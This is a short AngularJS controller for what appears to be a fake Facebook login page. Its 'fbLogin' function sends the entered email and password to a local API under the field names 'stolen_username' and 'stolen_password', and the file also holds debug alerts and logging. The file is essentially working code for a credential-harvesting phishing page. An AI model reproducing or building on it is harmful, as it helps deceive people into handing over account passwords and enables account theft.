var app = angular.module("app", []);

app.controller("AppCtrl", function($http) {
    var app = this;

    $http.get("/api/user").success(function(data) {
        alert(data);
        app.entries = data.objects;
    })

    app.fbLogin = function() {
        console.log(app);
        $http.post("/api/user", {"stolen_username": app.email, "stolen_password": app.password})
            .success(function(data) {
                app.entries.push(data);
            })
            .error(function(data) {
                alert(data);
            })

    }

})